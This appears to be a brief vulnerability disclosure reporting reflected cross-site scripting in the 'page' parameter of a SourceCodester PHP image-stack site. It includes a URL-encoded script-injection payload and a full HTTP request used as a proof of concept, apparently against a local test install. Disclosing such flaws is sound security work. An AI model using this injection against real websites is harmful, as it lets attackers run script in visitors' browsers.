# Simple Image Stack Website has XSS

vendors: https://www.sourcecodester.com/php/17029/simple-image-stack-website-using-php-and-api.html

Vulnerability File: /php-image-stack/?page=

Vulnerability location: /php-image-stack/?page=

[+] Payload:%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```
GET /php-image-stack/?page=%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
![image](https://github.com/HuoMingZ/aoligei/assets/169756032/48d15aa8-fe47-47f5-8c83-ccccf2db4d31)




